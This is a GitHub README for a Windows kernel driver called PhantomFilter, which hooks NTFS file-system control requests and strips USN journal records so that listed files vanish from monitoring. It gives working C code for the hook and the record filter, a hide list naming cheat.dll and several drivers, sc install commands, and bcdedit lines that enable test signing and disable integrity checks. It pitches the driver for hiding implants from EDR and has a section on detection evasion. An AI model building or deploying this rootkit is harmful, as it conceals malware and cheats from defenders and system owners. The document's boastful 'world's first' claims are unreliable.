# PhantomFilter 👻

**🌟 WORLD'S FIRST Advanced Windows USN Journal Filtering Driver - Revolutionary Transparent File Hiding 🌟**

## 🚀 Revolutionary Innovation

**PhantomFilter** is the **WORLD'S FIRST** kernel-mode driver that implements **transparent USN (Update Sequence Number) journal filtering**. This groundbreaking technique was conceived, designed, and implemented entirely by **[odin-xd](https://github.com/odin-xd)** - making it the **first-ever** solution of its kind in cybersecurity history.

### 🏆 Pioneering Achievement

- **🥇 FIRST IN THE WORLD**: No existing solution has ever implemented transparent USN journal filtering
- **🎯 Original Research**: 100% novel approach conceived by odin-xd
- **⚡ Revolutionary Method**: Unlike traditional file hiding that blocks access, PhantomFilter maintains tool functionality
- **🔬 Zero Prior Art**: This technique has never been documented or implemented before
- **Real-time Filtering**: Files are filtered from journal results in real-time
- **IRP-Level Hooking**: Hooks at the lowest safe kernel level (IRP_MJ_FILE_SYSTEM_CONTROL)
- **PatchGuard Compatible**: No direct SSDT modifications, safe from Windows PatchGuard
- **Zero Detection**: Target files become invisible to journal monitoring without tool disruption

## 🔧 How It Works

### Architecture Overview

```
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
│  USN Tools      │────│  PhantomFilter   │────│  NTFS Driver    │
│ (JournalTrace)  │    │  (IRP Hook)      │    │  (Filesystem)   │
└─────────────────┘    └──────────────────┘    └─────────────────┘
        │                        │                        │
        │  FSCTL_READ_USN_JOURNAL │                       │
        ├───────────────────────→│                        │
        │                        │  Forward Request       │
        │                        ├──────────────────────→│
        │                        │                        │
        │                        │  ← Raw USN Data        │
        │                        │←──────────────────────│
        │                        │                        │
        │                        │ [FILTER RECORDS]      │
        │                        │ Remove target files    │
        │  ← Filtered Results     │                        │
        │←──────────────────────│                        │
        │                        │                        │
```

### Technical Implementation

PhantomFilter operates by:

1. **Hooking NTFS IRP Handler**: Intercepts `IRP_MJ_FILE_SYSTEM_CONTROL` requests
2. **Identifying USN Requests**: Filters `FSCTL_READ_USN_JOURNAL` and `FSCTL_ENUM_USN_DATA`
3. **Transparent Processing**: Allows original request to complete normally
4. **Post-Processing Filtering**: Parses and filters USN_RECORD_V2 structures
5. **Buffer Modification**: Removes target file records and adjusts buffer size

## 📋 Code Examples

### Driver Entry Point

```c
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    // Initialize logging and locate NTFS driver
    NTSTATUS status = InstallPrivateInterceptionHook();
    
    if (NT_SUCCESS(status)) {
        DriverObject->DriverUnload = PrivateDriverCleanup;
    }
    
    return status;
}
```

### IRP Interception Hook

```c
NTSTATUS PrivateFsControlInterceptor(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
    ULONG controlCode = irpSp->Parameters.FileSystemControl.FsControlCode;
    
    // Intercept USN journal operations
    if (controlCode == FSCTL_READ_USN_JOURNAL || 
        controlCode == FSCTL_ENUM_USN_DATA) {
        
        // Call original handler first
        NTSTATUS status = g_OriginalDispatcher(DeviceObject, Irp);
        
        // Filter results if successful
        if (NT_SUCCESS(status) && status != STATUS_PENDING) {
            FilterUsnResults(Irp);
        }
        
        return status;
    }
    
    return g_OriginalDispatcher(DeviceObject, Irp);
}
```

### USN Record Parsing

```c
// USN Journal Buffer Structure:
// [ULONGLONG NextUSN][USN_RECORD_V2][USN_RECORD_V2]...

VOID FilterUsnResults(PIRP Irp) {
    PUCHAR buffer = GetIrpBuffer(Irp);
    PUCHAR recordStart = buffer + sizeof(ULONGLONG);  // Skip NextUSN
    PUCHAR bufferEnd = buffer + Irp->IoStatus.Information;
    
    PUCHAR readPtr = recordStart;
    PUCHAR writePtr = recordStart;
    
    while (readPtr < bufferEnd) {
        PUSN_RECORD_V2 record = (PUSN_RECORD_V2)readPtr;
        
        // Extract filename from record
        PWCHAR fileName = (PWCHAR)((PUCHAR)record + record->FileNameOffset);
        
        // Check if file should be hidden
        if (!ShouldHideFile(fileName)) {
            // Keep this record - copy to writePtr
            if (writePtr != readPtr) {
                RtlMoveMemory(writePtr, readPtr, record->RecordLength);
            }
            writePtr += record->RecordLength;
        }
        // Skip hidden files (don't advance writePtr)
        
        readPtr += record->RecordLength;
        readPtr = (PUCHAR)(((ULONG_PTR)readPtr + 7) & ~7);  // 8-byte align
    }
    
    // Update buffer size to reflect filtered results
    ULONG newSize = sizeof(ULONGLONG) + (ULONG)(writePtr - recordStart);
    Irp->IoStatus.Information = newSize;
}
```

### Target Files Configuration

```c
const char* g_TargetFileList[] = {
    "hypervideo.sys",      // Hide HyperVideo driver
    "winverbs.sys",        // Hide WinVerbs driver  
    "merged_driver.sys",   // Hide custom driver
    "usn_hook_driver.sys", // Hide USN hook driver
    "usn_irp_hook.sys",    // Hide IRP hook driver
    "cheat.dll",           // Hide cheat library
    NULL                   // Null terminator
};
```

## 🛠️ Installation

### Prerequisites

- Windows 10/11 (x64)
- Visual Studio 2019 Build Tools
- Windows Driver Kit (WDK)
- Test signing enabled or valid code signing certificate

### Build Instructions

```batch
# Clone repository
git clone https://github.com/yourusername/PhantomFilter.git
cd PhantomFilter

# Install driver
sc create phantomfilter type= kernel binPath= "C:\path\to\PhantomFilter.sys"
sc start phantomfilter
```

### Enable Test Signing (Development)

```batch
# Enable test mode
bcdedit /set testsigning on
bcdedit /set loadoptions DISABLE_INTEGRITY_CHECKS

# Restart required
shutdown /r /t 0
```

## 🔬 Technical Details

### USN_RECORD_V2 Structure

```c
typedef struct {
    ULONG RecordLength;        // Length of this record
    USHORT MajorVersion;       // Major version (2)
    USHORT MinorVersion;       // Minor version (0)
    ULONGLONG FileReferenceNumber; // File reference number
    ULONGLONG ParentFileReferenceNumber; // Parent directory reference
    USN Usn;                   // Update sequence number
    LARGE_INTEGER TimeStamp;   // Timestamp of change
    ULONG Reason;              // Reason for change
    ULONG SourceInfo;          // Source information
    ULONG SecurityId;          // Security ID
    ULONG FileAttributes;      // File attributes
    USHORT FileNameLength;     // Length of filename in bytes
    USHORT FileNameOffset;     // Offset to filename (typically 60)
    WCHAR FileName[1];         // Variable length filename
} USN_RECORD_V2, *PUSN_RECORD_V2;
```

### Filtering Algorithm

1. **Parse Buffer Header**: Extract NextUSN (8 bytes)
2. **Iterate Records**: Parse each USN_RECORD_V2 structure
3. **Validate Record**: Check RecordLength and boundaries
4. **Extract Filename**: Use FileNameOffset and FileNameLength
5. **Filter Decision**: Compare against target file list
6. **Compact Buffer**: Remove filtered records, maintain alignment
7. **Update Size**: Adjust IRP Information field

### Memory Layout

```
Original Buffer:
┌─────────────┬──────────────┬──────────────┬──────────────┐
│   NextUSN   │  Record #1   │  Record #2   │  Record #3   │
│  (8 bytes)  │  (Target)    │  (Keep)      │  (Keep)      │
└─────────────┴──────────────┴──────────────┴──────────────┘

Filtered Buffer:
┌─────────────┬──────────────┬──────────────┐
│   NextUSN   │  Record #2   │  Record #3   │
│  (8 bytes)  │  (Keep)      │  (Keep)      │
└─────────────┴──────────────┴──────────────┘
```

## 🎯 Use Cases

- **Red Team Operations**: Hide implants from EDR USN monitoring
- **Malware Research**: Study evasion techniques in controlled environments  
- **Security Testing**: Test monitoring tool effectiveness
- **Educational**: Learn kernel-mode Windows internals

## ⚠️ Important Notes

### Requirements

- **Kernel Mode**: Runs in kernel space with ring-0 privileges
- **Driver Signing**: Must be signed for production use

### Limitations

- Only filters synchronous USN operations (STATUS_PENDING operations logged but not filtered)
- Windows 10/11 x64 only

### Security Considerations

- Designed for authorized security research and education only
- Should not be used for malicious purposes
- Requires administrative privileges and driver signing
- May be detected by advanced EDR solutions

## 📊 Performance Impact

- **Minimal Overhead**: Only processes USN journal requests
- **Transparent Operation**: No impact on normal file operations
- **Memory Efficient**: In-place buffer filtering when possible
- **CPU Usage**: Negligible impact on system performance

## 🔍 Detection Evasion

### Techniques Used

1. **No SSDT Hooks**: Avoids easily detected system call table modifications
2. **IRP-Level Hooking**: Operates at legitimate kernel interface level  
3. **Transparent Filtering**: Tools continue to function normally
4. **Dynamic Analysis Resistant**: No obvious behavioral indicators
5. **Minimal Footprint**: Small driver with standard kernel APIs

## 🌟 Historical Significance

### World's First Implementation

**PhantomFilter represents a historic milestone in cybersecurity research:**

- **🏆 First Ever**: No prior implementation of transparent USN journal filtering exists
- **📚 No Documentation**: This technique has never been documented in academic or industry literature
- **🔬 Original Research**: Entirely novel approach developed from scratch
- **⚡ Paradigm Shift**: Changes how we think about file hiding and EDR evasion
- **🎯 Innovation Leader**: Sets the standard for next-generation stealth techniques

### Impact on Security Research

This groundbreaking work by **odin-xd** opens new avenues for:
- Advanced persistence mechanisms
- EDR evasion research  
- File system security analysis
- Kernel-mode stealth techniques
- Next-generation red team tools

## 🏆 Credits & Attribution

### Creator & Innovator
**🌟 ALL CREDITS GO TO [odin-xd](https://github.com/odin-xd) 🌟**

- **Original Concept**: 100% conceived by odin-xd
- **Research & Development**: Entirely designed and implemented by odin-xd
- **Innovation**: World's first transparent USN journal filtering technique
- **Implementation**: Complete kernel driver architecture by odin-xd

### Recognition
This groundbreaking work represents **odin-xd's** pioneering contribution to cybersecurity research. The PhantomFilter technique stands as the **FIRST OF ITS KIND** in the world, with all intellectual property and innovation credits belonging exclusively to **odin-xd**.

## 📖 Research & References

- [Windows USN Journal Documentation](https://docs.microsoft.com/en-us/windows/win32/fileio/change-journals)
- [IRP Processing in File System Drivers](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/irp-processing)
- [NTFS File System Internals](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/file-system-fundamentals)
- **PhantomFilter Technique**: Original research by [odin-xd](https://github.com/odin-xd) (WORLD'S FIRST)

## 📄 License

```
MIT License - Educational Use Only

Copyright (c) 2026 odin-xd
World's First USN Journal Filtering Implementation

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software for educational and research purposes only.

ALL CREDITS AND RECOGNITION GO TO odin-xd FOR THIS PIONEERING INNOVATION.
```

## 🤝 Contributing

This is a **pioneering research project** representing the **WORLD'S FIRST** implementation of transparent USN journal filtering. All source code is included and available for study, modification, and contribution.

Welcome contributions:
- Bug fixes and improvements
- Additional hiding techniques
- Performance optimizations
- Platform compatibility enhancements

---

⚡ **PhantomFilter** - The WORLD'S FIRST transparent USN journal filtering driver ⚡

🌟 **Created by [odin-xd](https://github.com/odin-xd) - Pioneer of Transparent File Hiding** 🌟

*For educational and authorized security research purposes only*
